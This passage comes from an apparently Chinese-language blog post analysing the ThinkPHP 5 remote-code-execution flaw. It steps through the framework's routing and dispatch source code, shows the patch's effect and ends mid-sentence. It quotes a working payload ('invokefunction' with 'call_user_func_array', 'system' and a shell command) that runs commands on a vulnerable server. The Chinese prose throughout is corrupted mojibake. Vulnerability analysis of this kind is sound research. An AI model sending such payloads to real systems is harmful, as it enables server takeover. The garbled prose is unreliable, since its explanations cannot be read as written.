class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">path</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        $suffix   = Config::get(<span class="string">'url_html_suffix'</span>);</span><br><span class="line">        $pathinfo = <span class="keyword">$this</span>-&gt;pathinfo();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === $suffix) &#123;</span><br><span class="line">            <span class="comment">// ç¦æ­¢ä¼ªé™æ€è®¿é—®</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = $pathinfo;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($suffix) &#123;</span><br><span class="line">            <span class="comment">// å»é™¤æ­£å¸¸çš„URLåç¼€</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = preg_replace(<span class="string">'/\.('</span> . ltrim($suffix, <span class="string">'.'</span>) . <span class="string">')$/i'</span>, <span class="string">''</span>, $pathinfo);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// å…è®¸ä»»ä½•åç¼€è®¿é—®</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = preg_replace(<span class="string">'/\.'</span> . <span class="keyword">$this</span>-&gt;ext() . <span class="string">'$/i'</span>, <span class="string">''</span>, $pathinfo);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Config::get(&#39;var_pathinfo&#39;)</code>æ˜¯é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®çš„å‚æ•°ï¼Œé»˜è®¤å€¼ä¸º<code>s</code>ï¼Œæ€ä¹ˆæ‰¾åˆ°è¿™ä¸ªå˜é‡ï¼Ÿå¯ä»¥å…¨å±€æœç´¢ä¸€ä¸‹ï¼Œå¯ä»¥æœç´¢åˆ°å…¶ä¸­ä¸€ä¸ªé…ç½®æ–‡ä»¶é‡Œé¢æœ‰</p><p><img src="https://s2.ax1x.com/2019/02/15/kDThFS.png" alt="kDThFS.png"></p><p>ä»GETä¸­è·å–é”®å€¼ï¼Œç„¶åèµ‹å€¼ç»™<code>routeCheck</code>ä¸­çš„<code>$path</code>ï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯<code>index/think\app/invokefunction</code>ã€‚</p><p><img src="https://s2.ax1x.com/2019/02/15/kDTvYF.png" alt="kDTvYF.png"></p><p>ç„¶åå¼€å§‹è¿›å…¥è·¯ç”±æ£€æµ‹çš„éƒ¨åˆ†ï¼Œç»è¿‡checkçš„æ£€æŸ¥åä¼šè¿›å…¥elseçš„åˆ†æ”¯ï¼Œä½†è¿™ä¸€éƒ¨åˆ†å¯¹äºæˆ‘ä»¬éœ€è¦æ§åˆ¶çš„å˜é‡æ²¡æœ‰ä»»ä½•å½±å“ï¼Œå…³é”®æ˜¯<code>$result</code>ä»¥åŠ<code>$must</code>è¿™ä¸¤ä¸ªå˜é‡çš„èµ‹å€¼ç»“æœï¼Œè¿™ä¹Ÿæ˜¯å¯¼è‡´äº†åé¢æ“ä½œçš„å…³é”®ï¼Œå¯ä»¥è¿›å…¥<code>Route::parseUrl</code>å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span><span class="params">($request, array $config)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $path   = $request-&gt;path();</span><br><span class="line">        $depr   = $config[<span class="string">'pathinfo_depr'</span>];</span><br><span class="line">        $result = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·¯ç”±æ£€æµ‹</span></span><br><span class="line">        $check = !is_null(<span class="keyword">self</span>::$routeCheck) ? <span class="keyword">self</span>::$routeCheck : $config[<span class="string">'url_route_on'</span>];</span><br><span class="line">        <span class="keyword">if</span> ($check) &#123;</span><br><span class="line">            <span class="comment">// å¼€å¯è·¯ç”±</span></span><br><span class="line">            <span class="keyword">if</span> (is_file(RUNTIME_PATH . <span class="string">'route.php'</span>)) &#123;</span><br><span class="line">                <span class="comment">// è¯»å–è·¯ç”±ç¼“å­˜</span></span><br><span class="line">                $rules = <span class="keyword">include</span> RUNTIME_PATH . <span class="string">'route.php'</span>;</span><br><span class="line">                is_array($rules) &amp;&amp; Route::rules($rules);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $files = $config[<span class="string">'route_config_file'</span>];</span><br><span class="line">                <span class="keyword">foreach</span> ($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (is_file(CONF_PATH . $file . CONF_EXT)) &#123;</span><br><span class="line">                        <span class="comment">// å¯¼å…¥è·¯ç”±é…ç½®</span></span><br><span class="line">                        $rules = <span class="keyword">include</span> CONF_PATH . $file . CONF_EXT;</span><br><span class="line">                        is_array($rules) &amp;&amp; Route::import($rules);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è·¯ç”±æ£€æµ‹ï¼ˆæ ¹æ®è·¯ç”±å®šä¹‰è¿”å›ä¸åŒçš„URLè°ƒåº¦ï¼‰</span></span><br><span class="line">            $result = Route::check($request, $path, $depr, $config[<span class="string">'url_domain_deploy'</span>]);</span><br><span class="line">            $must   = !is_null(<span class="keyword">self</span>::$routeMust) ? <span class="keyword">self</span>::$routeMust : $config[<span class="string">'url_route_must'</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($must &amp;&amp; <span class="keyword">false</span> === $result) &#123;</span><br><span class="line">                <span class="comment">// è·¯ç”±æ— æ•ˆ</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RouteNotFoundException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·¯ç”±æ— æ•ˆ è§£ææ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/å‚æ•°... æ”¯æŒæ§åˆ¶å™¨è‡ªåŠ¨æœç´¢</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">            $result = Route::parseUrl($path, $depr, $config[<span class="string">'controller_auto_search'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>Route::parseUrl</code>å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span><span class="params">($url, $depr = <span class="string">'/'</span>, $autoSearch = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">self</span>::$bind[<span class="string">'module'</span>])) &#123;</span><br><span class="line">            $bind = str_replace(<span class="string">'/'</span>, $depr, <span class="keyword">self</span>::$bind[<span class="string">'module'</span>]);</span><br><span class="line">            <span class="comment">// å¦‚æœæœ‰æ¨¡å—/æ§åˆ¶å™¨ç»‘å®š</span></span><br><span class="line">            $url = $bind . (<span class="string">'.'</span> != substr($bind, <span class="number">-1</span>) ? $depr : <span class="string">''</span>) . ltrim($url, $depr);</span><br><span class="line">        &#125;</span><br><span class="line">        $url              = str_replace($depr, <span class="string">'|'</span>, $url);</span><br><span class="line">        <span class="keyword">list</span>($path, $var) = <span class="keyword">self</span>::parseUrlPath($url);</span><br><span class="line">        ....</span><br><span class="line">         <span class="keyword">return</span> [<span class="string">'type'</span> =&gt; <span class="string">'module'</span>, <span class="string">'module'</span> =&gt; $route];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å†è·Ÿè¿›ä¸€ä¸‹<code>parseUrlPath()</code>ï¼Œè¿™é‡Œé¢å°±æ˜¯è¿”å›ä¸€ä¸ª$pathå˜é‡ï¼Œå¯¹åŒ…å«<code>æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ</code>çš„URLè¿›è¡Œåˆ†å‰²æˆæ•°ç»„è¿›è¡Œè¿”å›</p><p><img src="https://s2.ax1x.com/2019/02/15/kDHQgJ.png" alt="kDHQgJ.png"></p><p>å›åˆ°ä¸Šä¸€å±‚çš„å‡½æ•°ä¸­ï¼Œç»§ç»­è·Ÿè¿›ï¼Œå¯ä»¥å‘ç°åœ¨è‡ªåŠ¨æœç´¢æ§åˆ¶å™¨çš„åˆ¤æ–­ä¸­è¿›å…¥äº†elseè¯­å¥ï¼Œä»è€Œä¸ºæ§åˆ¶å™¨è¿›è¡Œäº†èµ‹å€¼ï¼Œè¿™é‡Œæ˜¯ä¸ªèµ‹å€¼ç‚¹ï¼Œå¾ˆå…³é”®</p><p><img src="https://s2.ax1x.com/2019/02/15/kDHtUK.png" alt="kDHtUK.png"></p><p>ç„¶åä»¥$routeå˜é‡è¿”å›ä¸Šå±‚runå‡½æ•°</p><p><img src="https://s2.ax1x.com/2019/02/15/kDHrDI.png" alt="kDHrDI.png"></p><p>æ­¤æ—¶$dispatch è¿›å…¥åˆ°self::exec()ä¸­ï¼Œç»§ç»­è·Ÿè¿›ã€‚æ­¤æ—¶çš„$dispatch é‡Œé¢æ˜¯ä¸€ä¸ªä»¥moduleä¸ºåå­—çš„æ•°ç»„ï¼Œæ‰€ä»¥è¿›å…¥execå‡½æ•°ä¸­å¿…å°†è¿›å…¥åˆ†æ”¯ä¸ºmoduleçš„æ¨¡å—ï¼Œç„¶åè¿›å…¥<code>self::module</code>å‡½æ•°</p><p><img src="https://s2.ax1x.com/2019/02/15/kDbesA.png" alt="kDbesA.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">($dispatch, $config)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($dispatch[<span class="string">'type'</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'redirect'</span>: <span class="comment">// é‡å®šå‘è·³è½¬</span></span><br><span class="line">                $data = Response::create($dispatch[<span class="string">'url'</span>], <span class="string">'redirect'</span>)</span><br><span class="line">                    -&gt;code($dispatch[<span class="string">'status'</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'module'</span>: <span class="comment">// æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ</span></span><br><span class="line">                $data = <span class="keyword">self</span>::module(</span><br><span class="line">                    $dispatch[<span class="string">'module'</span>],</span><br><span class="line">                    $config,</span><br><span class="line">                    <span class="keyword">isset</span>($dispatch[<span class="string">'convert'</span>]) ? $dispatch[<span class="string">'convert'</span>] : <span class="keyword">null</span></span><br><span class="line">                );</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            ...............</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>self::module</code>å‡½æ•°ï¼Œåœ¨è¿›å…¥å¤šæ¨¡å—éƒ¨ç½²åç”±äºï¼Œbindçš„å€¼ä¸ºnullï¼Œä¼šè¿›å…¥elseifçš„æ¡ä»¶ï¼Œä½¿availableçš„å˜é‡æˆä¸ºtrueï¼Œè¿™ä¹Ÿæ˜¯åé¢ä¸ºä»€ä¹ˆå¯ä»¥é¡ºåˆ©åˆå§‹åŒ–moduleçš„æ¡ä»¶ï¼Œä¸ç„¶å°±ä¼šæŠ›å‡ºå¼‚å¸¸XDã€‚</p><p><img src="https://s2.ax1x.com/2019/02/15/kDbqeI.png" alt="kDbqeI.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span><span class="params">($result, $config, $convert = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($result)) &#123;</span><br><span class="line">        $result = explode(<span class="string">'/'</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $request = Request::instance();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($config[<span class="string">'app_multi_module'</span>]) &#123;</span><br><span class="line">        <span class="comment">// å¤šæ¨¡å—éƒ¨ç½²</span></span><br><span class="line">        $module    = strip_tags(strtolower($result[<span class="number">0</span>] ?: $config[<span class="string">'default_module'</span>]));</span><br><span class="line">        $bind      = Route::getBind(<span class="string">'module'</span>);</span><br><span class="line">        $available = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($bind) &#123;</span><br><span class="line">            <span class="comment">// ç»‘å®šæ¨¡å—</span></span><br><span class="line">            <span class="keyword">list</span>($bindModule) = explode(<span class="string">'/'</span>, $bind);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>($result[<span class="number">0</span>])) &#123;</span><br><span class="line">                $module    = $bindModule;</span><br><span class="line">                $available = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ($module == $bindModule) &#123;</span><br><span class="line">                $available = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!in_array($module, $config[<span class="string">'deny_module_list'</span>]) &amp;&amp; is_dir(APP_PATH . $module)) &#123;</span><br><span class="line">            $available = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¨¡å—åˆå§‹åŒ–</span></span><br><span class="line">        <span class="keyword">if</span> ($module &amp;&amp; $available) &#123;</span><br><span class="line">            <span class="comment">// åˆå§‹åŒ–æ¨¡å—</span></span><br><span class="line">            $request-&gt;module($module);</span><br><span class="line">            $config = <span class="keyword">self</span>::init($module);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ¨¡å—è¯·æ±‚ç¼“å­˜æ£€æŸ¥</span></span><br><span class="line">            $request-&gt;cache(</span><br><span class="line">                $config[<span class="string">'request_cache'</span>],</span><br><span class="line">                $config[<span class="string">'request_cache_expire'</span>],</span><br><span class="line">                $config[<span class="string">'request_cache_except'</span>]</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'module not exists:'</span> . $module);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å•ä¸€æ¨¡å—éƒ¨ç½²</span></span><br><span class="line">        $module = <span class="string">''</span>;</span><br><span class="line">        $request-&gt;module($module);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®é»˜è®¤è¿‡æ»¤æœºåˆ¶</span></span><br><span class="line">    $request-&gt;filter($config[<span class="string">'default_filter'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å½“å‰æ¨¡å—è·¯å¾„</span></span><br><span class="line">    App::$modulePath = APP_PATH . ($module ? $module . DS : <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ˜¯å¦è‡ªåŠ¨è½¬æ¢æ§åˆ¶å™¨å’Œæ“ä½œå</span></span><br><span class="line">    $convert = is_bool($convert) ? $convert : $config[<span class="string">'url_convert'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–æ§åˆ¶å™¨å</span></span><br><span class="line">    $controller = strip_tags($result[<span class="number">1</span>] ?: $config[<span class="string">'default_controller'</span>]);</span><br><span class="line">    $controller = $convert ? strtolower($controller) : $controller;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–æ“ä½œå</span></span><br><span class="line">    $actionName = strip_tags($result[<span class="number">2</span>] ?: $config[<span class="string">'default_action'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($config[<span class="string">'action_convert'</span>])) &#123;</span><br><span class="line">        $actionName = Loader::parseName($actionName, <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $actionName = $convert ? strtolower($actionName) : $actionName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®å½“å‰è¯·æ±‚çš„æ§åˆ¶å™¨ã€æ“ä½œ</span></span><br><span class="line">    $request-&gt;controller(Loader::parseName($controller, <span class="number">1</span>))-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç›‘å¬module_init</span></span><br><span class="line">    Hook::listen(<span class="string">'module_init'</span>, $request);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $instance = Loader::controller(</span><br><span class="line">            $controller,</span><br><span class="line">            $config[<span class="string">'url_controller_layer'</span>],</span><br><span class="line">            $config[<span class="string">'controller_suffix'</span>],</span><br><span class="line">            $config[<span class="string">'empty_controller'</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å½“å‰æ“ä½œå</span></span><br><span class="line">    $action = $actionName . $config[<span class="string">'action_suffix'</span>];</span><br><span class="line"></span><br><span class="line">    $vars = [];</span><br><span class="line">    <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">        <span class="comment">// æ‰§è¡Œæ“ä½œæ–¹æ³•</span></span><br><span class="line">        $call = [$instance, $action];</span><br><span class="line">        <span class="comment">// ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å</span></span><br><span class="line">        $reflect    = <span class="keyword">new</span> \ReflectionMethod($instance, $action);</span><br><span class="line">        $methodName = $reflect-&gt;getName();</span><br><span class="line">        $suffix     = $config[<span class="string">'action_suffix'</span>];</span><br><span class="line">        $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">        $request-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">        <span class="comment">// ç©ºæ“ä½œ</span></span><br><span class="line">        $call = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">        $vars = [$actionName];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// æ“ä½œä¸å­˜åœ¨</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Hook::listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>::invokeMethod($call, $vars);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›çš„å°±æ˜¯æˆ‘åœ¨æ–‡ç« ä¸€å¼€å¤´è¯´çš„å†…å®¹ï¼Œcontrollerå˜é‡å°±è¢«èµ‹å€¼ï¼Œç„¶åè·å¾—æ–¹æ³•åå­—ï¼Œå¼€å§‹è¯·æ±‚è¿™ä¸ªæ–¹æ³•</p><p><img src="https://s2.ax1x.com/2019/02/15/kDqoNV.png" alt="kDqoNV.png"></p><p>æœ€åè¿˜æ˜¯è¿”å›äº†è¿™ä¸ªæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">self</span>::invokeMethod($call, $vars);</span><br></pre></td></tr></table></figure><p>$callå˜é‡æ˜¯ä¸ªæ•°ç»„ï¼Œé‡Œé¢åŒ…å«äº†æ§åˆ¶å™¨ä»¥åŠæ“ä½œï¼Œå¯ä»¥è¿½è¸ªé‡Œé¢çš„å˜é‡å˜åŒ–</p><p><img src="https://s2.ax1x.com/2019/02/15/kDL3uj.png" alt="kDL3uj.png"></p><p>ç„¶åé€šè¿‡<code>ReflectionMethod</code>æ–¹æ³•å»æ„é€ ä¸€ä¸ªæ˜ å°„ï¼Œåæ­£å°±æŠŠä»–å½“æˆå¹³å¸¸ä¸€ä¸ªç±»å»è°ƒç”¨æŸä¸ªæ–¹æ³•ï¼Œæ¥ç€å°±æŠŠå‰©ä½™çš„urlçš„å‰©ä½™å†…å®¹èµ‹å€¼ç»™argsï¼Œæœ€åè°ƒç”¨<code>invokefunction</code>å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¹Ÿç±»ä¼¼å›è°ƒå‡½æ•°ï¼Œæ‰€ä»¥å°±ä¼šæŠŠ<code>&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</code>ä¼ è¿›<code>invokefunction</code>è¿™ä¸ªæ–¹æ³•é‡Œé¢ã€‚</p><p><img src="https://s2.ax1x.com/2019/02/15/kDLOG8.png" alt="kDLOG8.png"></p><p><img src="https://s2.ax1x.com/2019/02/15/kDOPI0.png" alt="kDOPI0.png"></p><p>å¯ä»¥çœ‹åˆ°é‡Œé¢argsé‡Œé¢çš„å†…å®¹ç»“æ„ï¼Œé‡Œé¢åŒ…å«äº†å¤šä¸ªæ•°ç»„</p><p><img src="https://s2.ax1x.com/2019/02/15/kDO2es.png" alt="kDO2es.png"></p><p>ç»§ç»­è·Ÿè¿›çš„è¯ï¼Œä½ ä¼šå‘ç°è¿™ä¸ªå‡½æ•°è·Ÿä¸Šé¢è·Ÿè¿›çš„å‡½æ•°çš„å¥—è·¯ä¸€æ¨¡ä¸€æ ·ï¼Œä¹Ÿæ˜¯åˆ©ç”¨äº†å›è°ƒçš„æ•ˆæœï¼Œä¹Ÿæ˜¯åˆ©ç”¨ä¸€ä¸ªå˜é‡æŠŠsystemåé¢çš„å†…å®¹è¿”å›ç»™<code>call_user_func_array</code>ï¼Œåªä¸è¿‡è¿™æ¬¡å¯ä»¥ç›´æ¥è°ƒç”¨<code>call_user_func_array</code>äº†ï¼Œç›¸å½“äº<code>call_user_func_array(&quot;system&quot;,&quot;dir&quot;)</code>äº†</p><p><img src="https://s2.ax1x.com/2019/02/15/kDvUeJ.png" alt="kDvUeJ.png"></p><h3 id="è¡¥ä¸åçš„æ•ˆæœ"><a href="#è¡¥ä¸åçš„æ•ˆæœ" class="headerlink" title="è¡¥ä¸åçš„æ•ˆæœ"></a>è¡¥ä¸åçš„æ•ˆæœ</h3><p>å†æ¥è§‚å¯Ÿä¸€ä¸‹åŠ ä¸Šè¡¥ä¸çš„èµ°å‘ï¼Œç›´æ¥å°±ä¼šè¿›å…¥æŠ›å‡ºå¼‚å¸¸çš„æ­¥éª¤ï¼Œåªè¦åŒ¹é…åˆ°ä¸æ˜¯å­—æ¯å¼€å¤´çš„æ§åˆ¶å™¨çš„è¯ç›´æ¥è¿›å…¥å¼‚å¸¸ï¼Œæœ‰æ•ˆé¿å…åˆ©ç”¨å‘½åç©ºé—´æ„é€ æ”»å‡»é“¾</p><p><img src="https://s2.ax1x.com/2019/02/15/kDx8AA.png" alt="kDx8AA.png"></p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><ol><li>è¿™ä¸ªæ”»å‡»é“¾çš„æ„é€ ï¼Œè¿˜æ˜¯æ¦‚å¿µæ¨¡ç³Šï¼Œå¦‚æœçœŸæ­£æ„é€ çš„æ—¶å€™éœ€è¦æ€ä¹ˆå»åšï¼Ÿè¿™é‡Œåªæ˜¯æ ¹æ®åˆ«äººçš„payloadå»åˆ†æä»£ç ï¼Œåˆ†æå®ƒçš„æ”»å‡»è¿‡ç¨‹ï¼Œä¸ªäººæ„Ÿè§‰çœŸæ­£æ ¸å¿ƒçš„ä¸œè¥¿æ²¡æŒæ¡ï¼Œä¹Ÿæœ‰å¯èƒ½çœ‹å¾—å¤šå°±ä¼šäº†ï¼Ÿï¼Ÿï¼ŸXDå› ä¸ºè¿™ä¸ªä¸œè¥¿ä¸åªæ˜¯è¿™ä¸ªæ¨¡å—å¯ä»¥å¦‚æ­¤è°ƒç”¨ï¼Œè¿˜æœ‰å…¶ä»–æ¨¡å—ä¹Ÿæœ‰åŒæ ·çš„æ•ˆæœï¼Œè¿™ä¹Ÿæ¯”è¾ƒè€ƒéªŒå¯¹è¯¥æ¡†æ¶çš„ç†Ÿæ‚‰ç¨‹åº¦ï¼Œå¤šæ¥è§¦å¼€å‘è¿˜æ˜¯å¾ˆå¥½çš„ã€‚</li><li>çœ‹äº†å¥½å‡ ç¯‡æ–‡ç« 